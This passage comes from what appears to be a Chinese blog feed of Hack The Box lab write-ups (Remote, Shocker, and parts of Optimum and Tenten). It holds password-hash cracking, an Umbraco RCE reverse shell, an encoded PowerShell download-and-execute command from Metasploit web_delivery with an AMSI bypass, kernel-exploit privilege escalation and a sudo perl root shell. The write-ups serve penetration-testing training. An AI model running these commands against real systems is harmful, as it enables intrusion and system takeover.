<p>根据结果使用ms16_032 进行权限提升</p>
<img src="/Hackthebox/htb/htb-optimum/image-20250202185340241.png" class="" title="提权">



<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Users\kostas\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Remote</title>
    <url>/Hackthebox/htb/htb-remote/</url>
    <content><![CDATA[<style>.uoxhhrnakygv{zoom:50%;}</style><img src="/Hackthebox/htb/htb-remote/8d7c152dc9c28c9556b07dc724c6a37b.png" class="uoxhhrnakygv">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.180 <span class="token parameter variable">-sV</span>  -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> <span class="token parameter variable">-e</span> tun0 
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-02-23 <span class="token number">20</span>:44 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.180
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.13s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65516</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT      STATE    SERVICE       VERSION
<span class="token number">21</span>/tcp    <span class="token function">open</span>     <span class="token function">ftp</span>           Microsoft ftpd
<span class="token number">80</span>/tcp    <span class="token function">open</span>     http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token number">111</span>/tcp   <span class="token function">open</span>     rpcbind       <span class="token number">2</span>-4 <span class="token punctuation">(</span>RPC <span class="token comment">#100000)</span>
<span class="token number">135</span>/tcp   <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">139</span>/tcp   <span class="token function">open</span>     netbios-ssn   Microsoft Windows netbios-ssn
<span class="token number">445</span>/tcp   <span class="token function">open</span>     microsoft-ds?
<span class="token number">2049</span>/tcp  <span class="token function">open</span>     nlockmgr      <span class="token number">1</span>-4 <span class="token punctuation">(</span>RPC <span class="token comment">#100021)</span>
<span class="token number">5985</span>/tcp  <span class="token function">open</span>     http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token number">15264</span>/tcp filtered unknown
<span class="token number">22011</span>/tcp filtered unknown
<span class="token number">47001</span>/tcp <span class="token function">open</span>     http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token number">49664</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">49665</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">49666</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">49667</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">49678</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">49679</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">49680</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">53739</span>/tcp filtered unknown
Service Info: OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">251.51</span> seconds</code></pre>

<p>首先尝试FTP(21)匿名登录，啥也没有，然后对NFS(2049)进行测试，发现网站备份文件，挂载后可以查找到admin凭证</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ showmount <span class="token parameter variable">-e</span> <span class="token number">10.10</span>.10.180              
Export list <span class="token keyword">for</span> <span class="token number">10.10</span>.10.180:
/site_backups <span class="token punctuation">(</span>everyone<span class="token punctuation">)</span>
$ <span class="token function">mkdir</span> /tmp/site_backups 
$ <span class="token function">sudo</span> <span class="token function">mount</span> <span class="token parameter variable">-t</span> nfs <span class="token number">10.10</span>.10.180:/site_backups /tmp/site_backups
$ <span class="token builtin class-name">cd</span> /tmp/site_backups 
$ <span class="token function">ls</span>
App_Browsers  aspnet_client  css           Media    Umbraco_Client
App_Data      bin            default.aspx  scripts  Views
App_Plugins   Config         Global.asax   Umbraco  Web.config
$ <span class="token builtin class-name">cd</span> App_Data 
strings Umbraco.sdf <span class="token operator">|</span> <span class="token function">grep</span> admin
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa<span class="token punctuation">&#123;</span><span class="token string">"hashAlgorithm"</span><span class="token builtin class-name">:</span><span class="token string">"SHA1"</span><span class="token punctuation">&#125;</span>en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa<span class="token punctuation">&#123;</span><span class="token string">"hashAlgorithm"</span><span class="token builtin class-name">:</span><span class="token string">"SHA1"</span><span class="token punctuation">&#125;</span>admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa<span class="token punctuation">&#123;</span><span class="token string">"hashAlgorithm"</span><span class="token builtin class-name">:</span><span class="token string">"SHA1"</span><span class="token punctuation">&#125;</span>admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
User <span class="token string">"admin"</span> <span class="token operator">&lt;</span>admin@htb.local<span class="token operator">></span><span class="token number">192.168</span>.195.1User <span class="token string">"admin"</span> <span class="token operator">&lt;</span>admin@htb.local<span class="token operator">></span>umbraco/user/password/changepassword change
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span></code></pre>

<p>将获取到的密码hash进行破解，将收集到的用户名密码备用</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'b8be16afba8c314ad33d812f22a04991b90e2aaa'</span> <span class="token operator">></span> sha1  
$ john sha1 <span class="token parameter variable">--format</span><span class="token operator">=</span>Raw-SHA1 <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>Raw-SHA1 <span class="token punctuation">[</span>SHA1 <span class="token number">256</span>/256 AVX2 8x<span class="token punctuation">]</span><span class="token punctuation">)</span>
Warning: no OpenMP support <span class="token keyword">for</span> this <span class="token builtin class-name">hash</span> type, consider <span class="token parameter variable">--fork</span><span class="token operator">=</span><span class="token number">8</span>
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
baconandcheese   <span class="token punctuation">(</span>?<span class="token punctuation">)</span>     
1g <span class="token number">0</span>:00:00:00 DONE <span class="token punctuation">(</span><span class="token number">2025</span>-02-23 <span class="token number">21</span>:45<span class="token punctuation">)</span> <span class="token number">1</span>.694g/s 16650Kp/s 16650Kc/s 16650KC/s baconandchipies1<span class="token punctuation">..</span>bacon918
Use the <span class="token string">"--show --format=Raw-SHA1"</span> options to display all of the cracked passwords reliably
Session completed.                          </code></pre>

<p>添加本地域名解析到hosts文件，并访问站点，可以找到一个登录页面</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.180 remote.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts </code></pre>

<img src="/Hackthebox/htb/htb-remote/image-20250223220027043.png" class="" title="访问网站">

<p>使用收集到的用户名密码，登录网站，获取网站版本</p>
<img src="/Hackthebox/htb/htb-remote/image-20250223220241146.png" class="" title="登录页面">

<img src="/Hackthebox/htb/htb-remote/image-20250223220501688.png" class="" title="查看版本">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>通过检索可以在github 找到一个利用脚本：<a href="https://github.com/Jonoans/Umbraco-RCE">https://github.com/Jonoans/Umbraco-RCE</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ python exploit.py <span class="token parameter variable">-u</span> admin@htb.local <span class="token parameter variable">-p</span> baconandcheese <span class="token parameter variable">-w</span> <span class="token string">'http://remote.htb'</span> <span class="token parameter variable">-i</span> <span class="token number">10.10</span>.16.30
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Trying to <span class="token builtin class-name">bind</span> to :: on port <span class="token number">4444</span>: Done
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Waiting <span class="token keyword">for</span> connections on :::4444: Got connection from ::ffff:10.10.10.180 on port <span class="token number">49695</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Trying to <span class="token builtin class-name">bind</span> to :: on port <span class="token number">4445</span>: Done
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Waiting <span class="token keyword">for</span> connections on :::4445: Got connection from ::ffff:10.10.10.180 on port <span class="token number">49696</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Logging <span class="token keyword">in</span> at http://remote.htb/umbraco/backoffice/UmbracoApi/Authentication/PostLogin
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploiting at http://remote.htb/umbraco/developer/Xslt/xsltVisualize.aspx
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
PS C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>inetsrv<span class="token operator">></span> <span class="token function">whoami</span>
iis apppool<span class="token punctuation">\</span>defaultapppool
PS C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>inetsrv<span class="token operator">></span>  </code></pre>

<p>将shell 转移到msfconsole：使用<code>multi/script/web_delivery</code> 复制生成的powershell链接，在获取到的shell 上执行，成功获取到shell，查看系统信息为 Windows Server 2019 (10.0 Build 17763)</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> show targets 

Exploit targets:
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Id  Name
    --  ----
<span class="token operator">=</span><span class="token operator">></span>  <span class="token number">0</span>   Python
    <span class="token number">1</span>   PHP
    <span class="token number">2</span>   PSH
    <span class="token number">3</span>   Regsvr32
    <span class="token number">4</span>   pubprn
    <span class="token number">5</span>   SyncAppvPublishingServer
    <span class="token number">6</span>   PSH <span class="token punctuation">(</span>Binary<span class="token punctuation">)</span>
    <span class="token number">7</span>   Linux
    <span class="token number">8</span>   Mac OS X


msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> target <span class="token number">2</span>
target <span class="token operator">=</span><span class="token operator">></span> <span class="token number">2</span>
msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp
payload <span class="token operator">=</span><span class="token operator">></span> windows/x64/meterpreter/reverse_tcp
msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LPORT <span class="token number">4446</span>
LPORT <span class="token operator">=</span><span class="token operator">></span> <span class="token number">4446</span>
msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST tun0 
LHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">10.10</span>.16.30
msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> SRVPORT <span class="token number">8088</span>
SRVPORT <span class="token operator">=</span><span class="token operator">></span> <span class="token number">8088</span>
msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> exploit 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">10.10</span>.16.30:4446 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using URL: http://10.10.16.30:8088/1JHqco9l
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Server started.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Run the following <span class="token builtin class-name">command</span> on the target machine:
powershell.exe <span class="token parameter variable">-nop</span> <span class="token parameter variable">-w</span> hidden <span class="token parameter variable">-e</span> <span class="token assign-left variable">WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB6AG4AVABYAGcAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAegBuAFQAWABnAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAegBuAFQAWABnAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMwAwADoAOAAwADgAOAAvADEASgBIAHEAYwBvADkAbAAvAEUATABkAEkAMgBNAFUAUwAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMwAwADoAOAAwADgAOAAvADEASgBIAHEAYwBvADkAbAAnACkAKQA7AA</span><span class="token operator">==</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180     web_delivery - Delivering AMSI Bypass <span class="token punctuation">(</span><span class="token number">1383</span> bytes<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180     web_delivery - Delivering Payload <span class="token punctuation">(</span><span class="token number">3703</span> bytes<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">203846</span> bytes<span class="token punctuation">)</span> to <span class="token number">10.10</span>.10.180
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">10.10</span>.16.30:4446 -<span class="token operator">></span> <span class="token number">10.10</span>.10.180:49698<span class="token punctuation">)</span> at <span class="token number">2025</span>-02-23 <span class="token number">23</span>:07:25 +0800

msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> sessions 

Active sessions
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  <span class="token number">1</span>         meterpreter x64/windows  IIS APPPOOL<span class="token punctuation">\</span>DefaultAppPool @  <span class="token number">10.10</span>.16.30:4446 -<span class="token operator">></span> <span class="token number">10.10</span>.10.
                                      REMOTE                       <span class="token number">180</span>:49698 <span class="token punctuation">(</span><span class="token number">10.10</span>.10.180<span class="token punctuation">)</span>

msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> sessions <span class="token parameter variable">-i</span> <span class="token number">1</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting interaction with <span class="token number">1</span><span class="token punctuation">..</span>.

meterpreter <span class="token operator">></span> sysinfo 
Computer        <span class="token builtin class-name">:</span> REMOTE
OS              <span class="token builtin class-name">:</span> Windows Server <span class="token number">2019</span> <span class="token punctuation">(</span><span class="token number">10.0</span> Build <span class="token number">17763</span><span class="token punctuation">)</span>.
Architecture    <span class="token builtin class-name">:</span> x64
System Language <span class="token builtin class-name">:</span> en_US
Domain          <span class="token builtin class-name">:</span> WORKGROUP
Logged On Users <span class="token builtin class-name">:</span> <span class="token number">0</span>
Meterpreter     <span class="token builtin class-name">:</span> x64/windows</code></pre>

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用 <code>post/multi/recon/local_exploit_suggester</code>  收集信息，查找可以提权的脚本</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> use post/multi/recon/local_exploit_suggester 
msf6 post<span class="token punctuation">(</span>multi/recon/local_exploit_suggester<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> session <span class="token number">1</span>
session <span class="token operator">=</span><span class="token operator">></span> <span class="token number">1</span>
msf6 post<span class="token punctuation">(</span>multi/recon/local_exploit_suggester<span class="token punctuation">)</span> <span class="token operator">></span> exploit 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - Collecting <span class="token builtin class-name">local</span> exploits <span class="token keyword">for</span> x64/windows<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - <span class="token number">203</span> exploit checks are being tried<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The target appears to be vulnerable. Vulnerable Windows <span class="token number">10</span> v1809 build detected<span class="token operator">!</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2020_17136: The target appears to be vulnerable. A vulnerable Windows <span class="token number">10</span> v1809 build was detected<span class="token operator">!</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2021_40449: The target appears to be vulnerable. Vulnerable Windows <span class="token number">10</span> v1809 build detected<span class="token operator">!</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2022_21882_win32k: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2024_30088_authz_basep: The target appears to be vulnerable. Version detected: Windows Server <span class="token number">2019</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server <span class="token number">2019</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The <span class="token function">service</span> is running, but could not be validated.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running check method <span class="token keyword">for</span> exploit <span class="token number">48</span> / <span class="token number">48</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180 - Valid modules <span class="token keyword">for</span> session <span class="token number">1</span>:
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span></code></pre>

<p>根据查找结果使用 <code>windows/local/cve_2024_35250_ks_driver</code> 进行提权</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2024_35250_ks_driver<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST tun0 
LHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">10.10</span>.16.30
msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2024_35250_ks_driver<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> session <span class="token number">3</span>
session <span class="token operator">=</span><span class="token operator">></span> <span class="token number">3</span>
msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2024_35250_ks_driver<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LPORT <span class="token number">7777</span>
LPORT <span class="token operator">=</span><span class="token operator">></span> <span class="token number">7777</span>
msf6 exploit<span class="token punctuation">(</span>windows/local/cve_2024_35250_ks_driver<span class="token punctuation">)</span> <span class="token operator">></span> exploit 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">10.10</span>.16.30:7777 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running automatic check <span class="token punctuation">(</span><span class="token string">"set AutoCheck false"</span> to disable<span class="token punctuation">)</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server <span class="token number">2019</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Launching notepad to <span class="token function">host</span> the exploit<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> The notepad path is: C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>notepad.exe
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> The notepad pid is: <span class="token number">4628</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Reflectively injecting the DLL into <span class="token number">4628</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">203846</span> bytes<span class="token punctuation">)</span> to <span class="token number">10.10</span>.10.180
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">4</span> opened <span class="token punctuation">(</span><span class="token number">10.10</span>.16.30:7777 -<span class="token operator">></span> <span class="token number">10.10</span>.10.180:49703<span class="token punctuation">)</span> at <span class="token number">2025</span>-02-23 <span class="token number">23</span>:26:34 +0800

meterpreter <span class="token operator">></span> getuid 
Server username: NT AUTHORITY<span class="token punctuation">\</span>SYSTEM
meterpreter <span class="token operator">></span> 
</code></pre>

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Users\Public\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Shocker</title>
    <url>/Hackthebox/htb/htb-shocker/</url>
    <content><![CDATA[<style>.dxqvsktplzld{zoom:50%;}</style><img src="/Hackthebox/htb/htb-shocker/efef52a0fb63d9c8db0ab6e50cb6ac79.png" class="dxqvsktplzld">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Linux</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-shocker/image-20250216093127462.png" class="" title="Nmap">

<p>开放了80(HTTP) 和2222(SSH)</p>
<h3 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h3><p>使用dirb进行目录猜解，发现 <code>/cgi-bin/</code>目录</p>
<img src="/Hackthebox/htb/htb-shocker/image-20250216095828722.png" class="" title="dirb">

<p>然后使用Fuff 继续猜解，找到一个 <code>user.sh</code></p>
<img src="/Hackthebox/htb/htb-shocker/image-20250216095724470.png" class="" title="Fuff">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用msfconsole <code>multi/http/apache_mod_cgi_bash_env_exec</code> 模块</p>
<img src="/Hackthebox/htb/htb-shocker/image-20250216101417329.png" class="" title="GetShell">



<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用sudo -l 发现可以利用perl 进行提权 <code>sudo /usr/bin/perl -e &#39;exec &quot;/bin/bash&quot;&#39;</code></p>
<img src="/Hackthebox/htb/htb-shocker/image-20250216103049798.png" class="" title="GetShell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;shelly&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>Shellshock</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Tenten</title>
    <url>/Hackthebox/htb/htb-tenten/</url>
    <content><![CDATA[<style>.ijtwsitypbdo{zoom:50%;}</style><img src="/Hackthebox/htb/htb-tenten/e58a465e93364c423cd2162945f8f7bf.png" class="ijtwsitypbdo">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Linux</td>
<td align="left">Medium</td>
</tr>
</tbody></table>
<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><img src="/Hackthebox/htb/htb-tenten/image-20250215132349182.png" class="" title="Nmap">

<p>开放了80端口，添加域名解析到hosts文件</p>
<pre class="language-none"><code class="language-none">$ echo &#39;10.10.10.10 tenten.htb&#39; | sudo tee -a &#x2F;etc&#x2F;hosts</code></pre>

